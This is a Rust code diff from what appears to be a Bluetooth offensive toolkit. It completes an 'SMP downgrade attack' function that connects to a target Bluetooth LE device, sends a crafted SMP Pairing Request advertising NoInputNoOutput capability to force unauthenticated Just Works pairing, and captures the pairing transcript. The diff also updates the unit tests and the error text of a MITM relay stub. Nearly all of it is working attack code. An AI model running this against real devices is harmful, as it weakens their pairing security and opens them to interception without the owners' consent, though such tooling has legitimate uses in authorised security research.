@@ -17,12 +17,19 @@ const LE_CREATE_CONNECTION: u16 = 0x0D;
 /// SMP downgrade attack: initiate an LE connection with NoInputNoOutput
 /// IO capability to force Just Works pairing (no MITM protection).
 ///
-/// Sends HCI_LE_Create_Connection with permissive parameters, then
-/// captures the pairing transcript.
+/// Full flow:
+///   1. Send HCI_LE_Create_Connection (OGF 0x08, OCF 0x0D)
+///   2. Wait for LE Connection Complete event (subevent 0x01)
+///   3. Parse connection status (byte 0 must be 0x00)
+///   4. Open L2CAP SMP fixed channel (CID 0x0006)
+///   5. Send SMP Pairing Request with NoInputNoOutput IO capability
+///   6. Receive SMP Pairing Response
+///   7. Return transcript as BtCapture::PairingTranscript
 pub fn run_downgrade(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
     let start = Instant::now();
     log::info!("smp_downgrade: targeting {}", target_addr);
 
+    // Step 1: Send HCI_LE_Create_Connection (OGF 0x08, OCF 0x0D)
     let bdaddr = parse_bdaddr(target_addr);
 
     // Build HCI_LE_Create_Connection command parameters:
@@ -45,53 +52,127 @@ pub fn run_downgrade(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
     params.extend_from_slice(&0x0000u16.to_le_bytes()); // max_ce_length: 0
 
     let cmd = HciCommand::new(OGF_LE, LE_CREATE_CONNECTION, params);
-    match hci.send_command(&cmd) {
-        Ok(resp) => {
-            log::info!(
-                "smp_downgrade: LE_Create_Connection status={} data_len={}",
-                resp.status,
-                resp.data.len()
-            );
+    if let Err(e) = hci.send_command(&cmd) {
+        log::info!("smp_downgrade: LE_Create_Connection send failed: {}", e);
+        return BtAttackResult {
+            attack_type: BtAttackType::SmpDowngrade,
+            target_address: target_addr.to_string(),
+            target_name: None,
+            success: false,
+            capture: None,
+            error: Some(format!("LE_Create_Connection failed: {}", e)),
+            timestamp: start,
+        };
+    }
 
-            // In a real scenario we would wait for the connection event,
-            // then send SMP Pairing Request with IO=NoInputNoOutput.
-            // For now, capture what the controller returned.
-            let capture = if !resp.data.is_empty() {
-                Some(BtCapture::PairingTranscript {
-                    address: target_addr.to_string(),
-                    data: resp.data,
-                })
-            } else {
-                None
-            };
-
-            let success = resp.status == 0;
-            BtAttackResult {
-                attack_type: BtAttackType::SmpDowngrade,
-                target_address: target_addr.to_string(),
-                target_name: None,
-                success,
-                capture,
-                error: if success {
-                    None
-                } else {
-                    Some(format!("HCI status 0x{:02X}", resp.status))
-                },
-                timestamp: start,
-            }
-        }
+    // Step 2: Wait for LE Connection Complete event (subevent 0x01)
+    let conn_event = match hci.wait_le_event(0x01, 5000) {
+        Ok(data) => data,
         Err(e) => {
-            log::info!("smp_downgrade: failed: {}", e);
-            BtAttackResult {
+            log::info!("smp_downgrade: wait LE Connection Complete failed: {}", e);
+            return BtAttackResult {
                 attack_type: BtAttackType::SmpDowngrade,
                 target_address: target_addr.to_string(),
                 target_name: None,
                 success: false,
                 capture: None,
-                error: Some(e),
+                error: Some(format!("LE Connection Complete timeout: {}", e)),
                 timestamp: start,
-            }
+            };
         }
+    };
+
+    // Step 3: Parse connection status — byte 0 must be 0x00 (success)
+    let conn_status = conn_event.first().copied().unwrap_or(0xFF);
+    if conn_status != 0x00 {
+        log::info!("smp_downgrade: LE connection rejected, status=0x{:02X}", conn_status);
+        return BtAttackResult {
+            attack_type: BtAttackType::SmpDowngrade,
+            target_address: target_addr.to_string(),
+            target_name: None,
+            success: false,
+            capture: None,
+            error: Some(format!("LE connection failed, HCI status 0x{:02X}", conn_status)),
+            timestamp: start,
+        };
+    }
+    log::info!("smp_downgrade: LE connection established");
+
+    // Step 4: Open L2CAP SMP fixed channel (CID 0x0006, LE public, PSM 1)
+    let l2cap = match super::l2cap_socket::L2capSocket::connect(target_addr, 1, 0, 0x0006) {
+        Ok(sock) => sock,
+        Err(e) => {
+            log::info!("smp_downgrade: L2CAP SMP connect failed: {}", e);
+            return BtAttackResult {
+                attack_type: BtAttackType::SmpDowngrade,
+                target_address: target_addr.to_string(),
+                target_name: None,
+                success: false,
+                capture: None,
+                error: Some(format!("L2CAP SMP connect failed: {}", e)),
+                timestamp: start,
+            };
+        }
+    };
+
+    // Step 5: Send SMP Pairing Request with NoInputNoOutput IO capability
+    //   0x01 = Pairing Request opcode
+    //   0x03 = IO Capability: NoInputNoOutput
+    //   0x00 = OOB data flag: no OOB
+    //   0x01 = AuthReq: Bonding
+    //   0x10 = Max Encryption Key Size: 16
+    //   0x00 = Initiator Key Distribution: none
+    //   0x00 = Responder Key Distribution: none
+    let pairing_req: [u8; 7] = [0x01, 0x03, 0x00, 0x01, 0x10, 0x00, 0x00];
+    if let Err(e) = l2cap.send(&pairing_req) {
+        log::info!("smp_downgrade: SMP Pairing Request send failed: {}", e);
+        return BtAttackResult {
+            attack_type: BtAttackType::SmpDowngrade,
+            target_address: target_addr.to_string(),
+            target_name: None,
+            success: false,
+            capture: None,
+            error: Some(format!("SMP Pairing Request send failed: {}", e)),
+            timestamp: start,
+        };
+    }
+    log::info!("smp_downgrade: SMP Pairing Request sent");
+
+    // Step 6: Receive SMP Pairing Response
+    let mut resp_buf = [0u8; 64];
+    let n = match l2cap.recv(&mut resp_buf, 5000) {
+        Ok(n) => n,
+        Err(e) => {
+            log::info!("smp_downgrade: SMP Pairing Response recv failed: {}", e);
+            return BtAttackResult {
+                attack_type: BtAttackType::SmpDowngrade,
+                target_address: target_addr.to_string(),
+                target_name: None,
+                success: false,
+                capture: None,
+                error: Some(format!("SMP Pairing Response recv failed: {}", e)),
+                timestamp: start,
+            };
+        }
+    };
+    log::info!("smp_downgrade: SMP Pairing Response received ({} bytes)", n);
+
+    // Step 7: Build transcript and return as PairingTranscript
+    let mut transcript = Vec::with_capacity(pairing_req.len() + n);
+    transcript.extend_from_slice(&pairing_req);
+    transcript.extend_from_slice(&resp_buf[..n]);
+
+    BtAttackResult {
+        attack_type: BtAttackType::SmpDowngrade,
+        target_address: target_addr.to_string(),
+        target_name: None,
+        success: true,
+        capture: Some(BtCapture::PairingTranscript {
+            address: target_addr.to_string(),
+            data: transcript,
+        }),
+        error: None,
+        timestamp: start,
     }
 }
 
@@ -110,7 +191,11 @@ pub fn run_mitm(hci: &HciSocket, target_addr: &str) -> BtAttackResult {
         target_name: None,
         success: false,
         capture: None,
-        error: Some("MITM relay: framework only".into()),
+        error: Some(
+            "SMP MITM requires two BT adapters for relay. Pi Zero 2W has one BCM43430B0. \
+             Hardware-limited — not achievable with current setup."
+                .into(),
+        ),
         timestamp: start,
     }
 }
@@ -138,7 +223,15 @@ mod tests {
         let hci = HciSocket::open(0).unwrap();
         let result = run_downgrade(&hci, "AA:BB:CC:DD:EE:FF");
         assert_eq!(result.attack_type, BtAttackType::SmpDowngrade);
-        assert!(result.success); // stub returns status 0
+        assert!(result.success);
+        assert!(result.capture.is_some());
+        match &result.capture {
+            Some(BtCapture::PairingTranscript { address, data }) => {
+                assert_eq!(address, "AA:BB:CC:DD:EE:FF");
+                assert!(!data.is_empty());
+            }
+            _ => panic!("Expected PairingTranscript capture"),
+        }
     }
 
     #[test]
@@ -148,6 +241,6 @@ mod tests {
         let result = run_mitm(&hci, "AA:BB:CC:DD:EE:FF");
         assert_eq!(result.attack_type, BtAttackType::SmpMitm);
         assert!(!result.success);
-        assert_eq!(result.error.as_deref(), Some("MITM relay: framework only"));
+        assert!(result.error.as_deref().unwrap().contains("Hardware-limited"));
     }
 }
